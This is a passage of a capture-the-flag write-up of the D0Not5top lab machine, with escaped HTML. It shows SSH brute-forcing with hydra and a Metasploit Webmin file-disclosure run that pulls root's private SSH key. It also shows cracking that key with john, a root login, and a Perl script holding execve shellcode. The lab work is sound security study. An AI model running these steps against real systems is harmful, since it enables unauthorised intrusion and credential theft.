&amp;gt; sMk0zUm9kemcwT0hSbE5qZDBaV3BsZVNBS++/ve+/ve+/vWnvv704OCQmCg==&quot;&lt;/span&gt; | base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
Salted__�y8j���Rkw0Nl82OnBxcGQyamZuNHJ1cTFvYnl2M3Rodzg0OHRlNjd0ZWpleSAK���i�88&lt;span class=&quot;nv&quot;&gt;$&amp;amp;&lt;/span&gt;
root@kali:~/Documents# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Rkw0Nl82OnBxcGQyamZuNHJ1cTFvYnl2M3Rodzg0OHRlNjd0ZWpleSAK&quot;&lt;/span&gt; | base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
FL46_6:pqpd2jfn4ruq1obyv3thw848te67tejey&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;One more to go! But after looking even more at the &lt;b&gt;ssh&lt;/b&gt; connection I found that this string may be a clue - &lt;b&gt;Uh0h.. u n0 burtieo&lt;/b&gt;. Is this username? If yes, we can try to crack it using &lt;b&gt;hydra&lt;/b&gt; and &lt;b&gt;rockyou.txt&lt;/b&gt; wordlist.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Documents# hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; burtieo &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /usr/share/wordlists/rockyou.txt 10.0.2.8 ssh
Hydra v8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2014 by van Hauser/THC - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes.

Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2017-06-09 06:57:53
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 4
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:14344399&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~14008 tries per task
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking service ssh on port 22
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 160.00 tries/min, 160 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:01h, 14344239 todo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1494:12h, 16 active
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 117.33 tries/min, 352 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:03h, 14344047 todo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2037:31h, 16 active
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 96.25 tries/min, 18384 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;03:11h, 14326015 todo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2480:40h, 16 active
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 96.23 tries/min, 19920 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;03:27h, 14324479 todo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2480:54h, 16 active
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 96.22 tries/min, 21456 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;03:43h, 14322943 todo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2481:04h, 16 active
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 96.20 tries/min, 22992 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;03:59h, 14321407 todo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2481:10h, 16 active
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ssh] host: 192.168.190.132 login: burtieo password: Lets you update your FunNotes and more!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another troll :/ Let's log in once more using these credentials. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;W2wC0m3 Bw3rtie0 :&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
burtieo@D0Not5top:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
burtieo@D0Not5top:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
/home/burtie
burtieo@D0Not5top:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;id
&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: id: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
burtieo@D0Not5top:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rbash&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It's an &lt;b&gt;rbash&lt;/b&gt;, and I'm not able to run mostly  any of the commands. After huge amount of trying different methods, enumerating, trying to break from the rbash, I gave up and with a little help found this command. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;burtieo@D0Not5top:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;suedoh &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
suedoh: unable to resolve host D0Not5top
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;burtieo on D0Not5top: env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin User burtieo may run the following commands on D0Not5top: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/wmstrt
burtieo@D0Not5top:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;suedoh /usr/bin/wmstrt
    D1dyaCatchaT3nK1l0?
    :D&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Running &lt;b&gt;suedoh /usr/bin/wmstrt&lt;/b&gt; opens another port, which we checked using &lt;b&gt;Nmap&lt;/b&gt;.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap 10.0.2.8

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-06-09 14:15 EDT
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;D0Not5topMe.ctf &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.0.2.8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00026s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 994 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
10000/tcp open  snet-sensor-mgmt
MAC Address: 08:00:27:58:A4:C4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.30 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As it's open only for certain amount of time, I decided to run a simple loop, that will keep this port open. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;burtieo@D0Not5top:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1..99999..1&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;suedoh /usr/bin/wmstrt&amp;amp;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
&lt;/span&gt;suedoh: unable to resolve host D0Not5top&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now what is &lt;b&gt;snet-sensor-mgmt&lt;/b&gt;? Googling that name gave us simple tip - it can be &lt;b&gt;webmin&lt;/b&gt; instance. We can try to attack it using &lt;b&gt;metasploit&lt;/b&gt;, but firstly, let's find an proper exploit. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# msfconsole

Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             http://metasploit.pro


Payload caught by AV? Fly under the radar with Dynamic Payloads in
Metasploit Pro -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.11.7-                             ]
+ -- --=[ 1518 exploits - 877 auxiliary - 259 post        ]
+ -- --=[ 437 payloads - 38 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf &amp;gt; search webmin
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                         Disclosure Date  Rank       Description
   ----                                         ---------------  ----       -----------
   auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     Webmin File Disclosure
   exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Webmin /file/show.cgi Remote Command Execution&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;File disclosure? We can use it to get the content of &lt;b&gt;ssh keys&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/admin/webmin/file_disclosure
msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;auxiliary/admin/webmin/file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name     Current Setting   Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   DIR      /unauthenticated  yes       Webmin directory path
   Proxies                    no        A proxy chain of format &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;:host:port[,type:host:port][...]
   RHOST                      yes       The target address
   RPATH    /etc/passwd       yes       The file to download
   RPORT    10000             yes       The target port
   VHOST                      no        HTTP server virtual host


Auxiliary action:

   Name      Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   Download


msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOST 10.0.2.8
RHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.0.2.8
msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;SSL True
SSL &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; True
msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RPATH /root/.ssh/id_rsa
RPATH &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /root/.ssh/id_rsa
msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Attempting to retrieve /root/.ssh/id_rsa...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; The server returned: 200 Document follows
&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7DA162212961C0CF94C636B47C991024

rDnUjh68EoasdaP40ta9QBeXtvB5uUVH9nKHKWo4KvhLcM4Z0/R6qvjSjlHir4LR
uhTb5Y+e2C7Wze8GlYbdGksFXbUztZec26vN7xH8Q4SeI++J77agqKWRE6jJ++hd
DsR7vDcqGbm9xX37BbE9Q4lLEHR/hNRe3/Ztrbt3obnCLvCW6H3kzpteycWAQQ3W
BaFns85p4AZn654HoIqX/UOkztdYxgOLgpzrLh9p1bRLiaOiBCrURkpYLspeKCNN
yfuPvNUgF1+uH78GlvLwfAA6XRj6HPDZ3D22/MxKcGixUVSPXjJlRpqyFQtvSM6T
cN5NmXjOjmzfgafqPqf7eTFfLChcsWHUmsSneq7pQhvw/vfeGX2kizuXCago+yWt
2IlFusQilfDDzybiunNOp+njD7TxeBLFcAUVdACfMUQ/fC0GHKeHB8q79Wi7r0SQ
m0eC6fIXJpDavN9PtPF2v+5OH9EDKycaeWMmWT0S0fNMmIhHb+U/uhtDjQx+M9fI
I5aBCjzCsDCoKT0qkv+dTafyqSzUN9EupCRh0NcsUT00yrQkxzM5L6C3H+61SNq8
CNi4I50aDp8q6m0KP/GZhUAU9Uegj+JZQ1h5MSnjOpOvKbD4l6/rWM02iFVAmg4O
WjSQfqbxGCmoHE8Y7iqgB8lRWnDYPssDXIMx+1pBkNkBASMpz6gJBZ//rJE1PkVr
aKdhbJFR1NX097z3HXS/7SBJmyuctG+JviH7mp1fH3WMAk2iu4nSiE1aNH1YV/nW
rXNOi5c7/yDE9o/weuJoCBL4VXeH89+l8551JOGU9RMuNk0pi/SSaUwwn7wR0/Yf
b9Sk3pbFDS64AON1T+4zlBWWif8aRMJ7Vm6zkDsE1Jq9nKcNzDknfufs45mKVzXU
m9dlGgzfNF46yPCuHzBZt4q1wrzg5/7gcWx5Qq6xD5VtWiMlB4G3D8DruaeqgTOi
Sh/jFqEOErA015Ympz/0Hh/lFn0NAAJy89BPG86d+VVAn5YstQEqH6zzuIy9mZ9K
853+0BUxA0I9rEessa+Q+NlFadBVE2FcJAr7rMsLGZFoqfvWxg5hBJFJ7jrjpQNe
Q9qzA/CbiMeU+zdifXZwprJR1fNVWalPJJGwotwVgXN/z4s8iN1gMN9y4Kynue9k
zQ/HqvgTkyX52ojLnM/PkXCyx7EXBAOJi5s6fv/22kcZ5Xkpw+x/VILPnJqObmU9
RZ3IB6kbckiMld5GX+xMvYi9rvmHf/mdLj75e7PU+FjCufApXAi+T10PnvMvrCGS
FkSlVyPPo1s4klTdrf2l6tkK6Lqu/7SamkvQvMsY7wnNT4OPI95y3GoRnwEFLd7w
honOroF1U6leA5O8jxSxI/CIwxvb5DO/sX4bZxShlhD98yO74ImAg5ACTj/eUaVA
/Q7bpfasSnqdKNWhx81pD6Ee9WeBZv8c0I0/EqS188O1qFYbtsaqZhYytTqYwvZ0
p6QuusMnDaA1nB8wL7ltKXt5PhBBxSVbUKtP6DWcBRviItFTsAnmK1QhD2wmTkCu
B8ochgwCgtAUs4cUXxnZrp5pu2yvu8Dhf//z8lBtoItPh5LTmW1N1g4s+9NKt72P
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Auxiliary module execution completed
msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;rpath /root/.ssh/id_rsa.pub
rpath &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; /root/.ssh/id_rsa.pub
msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;file_disclosure&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Attempting to retrieve /root/.ssh/id_rsa.pub...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; The server returned: 200 Document follows
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPKVt8KEVrr80LT9ZwRsWG8w9O2vgWd99+2+xmi3WCgCR/IrhqoJqEhX9owwiaUUnyRWrj9AKDj8Neetju9rOCTJsvWAlfFgyrRXkOV9twpLcrML+LC5GsVGLH7U/R2sTpT9Ywad0yL+FTvHZ+AbYLFpml4Gbhat6Ynhcg3Q6XmxGHXkV9cd6/XCx74K8CKEtOye1REj8KDtsC329qvbp/9Dt1ZZQEAUFvLqgLJiZxmH5snWiszcO2TKQ3lUw3tLy5rA/bXe3Bf4zuEmktEuA0NW+FTLYELrBy/5PK007Uh0CQVpVS5C+tkLtqh6meAXPp7dhi/B6qGOIXpPxjpUjH root@D0Not5top
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Auxiliary module execution completed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now, let's save the &lt;b&gt;ssh keys&lt;/b&gt; into the coresponding files called &lt;b&gt;id_rsa&lt;/b&gt; and &lt;b&gt;id_rsa.pub&lt;/b&gt;. Now, crack them.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh2john id_rsa &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; pass
root@kali:~# john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;:/usr/share/wordlists/rockyou.txt pass
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSH &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RSA/DSA 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
gustateamo       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;id_rsa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1g 0:00:01:09 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2017-06-09 15:14&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.01432g/s 110970p/s 110970c/s 110970C/s gustateamo
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Just as 'easy' as it looks. We're ready to log in and get the final flag. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# chmod 700 id_rsa
root@kali:~# ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa root@10.0.2.8

root@D0Not5top:~# &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;FL461N51D3  L45T_fl46.pl&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Remember the &lt;b&gt;L45T_fl46.pl&lt;/b&gt;? It was in the header of the first website, that we visited in this machine. Let's view it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-perl&quot; data-lang=&quot;perl&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl -w&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;######################################################&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#                                                    #&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#  W311 D0n3                                         #&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#  Y0u D1d N0t5top                                   #&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#  Much0 M3Gu5t4 :D                                  #&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#                                                    #&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#  3mrgnc3                                           #&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#                                                    #&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#  Hope you had fun...                               #&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#  8ut...                                            #&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#                                                    #&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#  p.s..                                             #&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#  571ll 1 M0r3 f146 :D                              #&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#                                                    #&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;######################################################&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;IO::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ARGV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Usage: L45T_fl46.pl &amp;lt;user&amp;gt; &amp;lt;flag&amp;gt;\n\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;	&lt;span class=&quot;s&quot;&gt;&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x3a\x39\x74\x6a\x74\x38\x36\x65\x76\x76\x63\x79\x77&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x75\x75\x66\x37\x37\x34\x68\x72\x38\x38\x65\x75\x69&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x33\x6e\x75\x73\x38\x64\x6c\x6b\x20\x32\x3e\x2f\x74&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x6d\x70\x2f\x68\x75\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x38&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;&quot;\x00\x00\x00\x59\x41\x59\x20\x46\x4c\x34\x36\x5f\x37&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
